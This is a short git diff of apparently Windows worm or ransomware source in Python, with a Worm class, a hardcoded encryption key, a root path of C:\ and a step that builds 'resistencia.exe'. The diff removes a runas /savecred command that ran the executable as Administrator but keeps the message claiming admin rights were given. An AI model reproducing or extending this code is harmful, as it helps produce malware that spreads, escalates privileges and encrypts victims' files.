@@ -11,7 +11,6 @@ ROOTDIR = r"C:\\"
 THIS_DIR = os.path.dirname(os.path.realpath(__file__))
 ENCRYPTOR_PATH = os.path.join(sys.path[0], "encryptor.py")
 KEY = b'k6XGrVRO4bCexC54uWlJgKPx9KloztECXpA-LywXDKo='
-PC_NAME = os.environ['COMPUTERNAME']
 
 class Worm:
     def __init__(self):
@@ -145,8 +144,7 @@ if __name__ == "__main__":
                 os.system("pyinstaller resistencia-exe.py --onefile --name resistencia")
                 print("[+] resistencia.exe Created")
 
-                RESISTENCIA_DIR = THIS_DIR + "\\dist\\resistencia.exe"
-                os.system(f"runas /user:{PC_NAME}\\Administrator /savecred {RESISTENCIA_DIR}")
+                
                 print("[!] given admin premissions to resistencia.exe")
 
                 time.sleep(1)
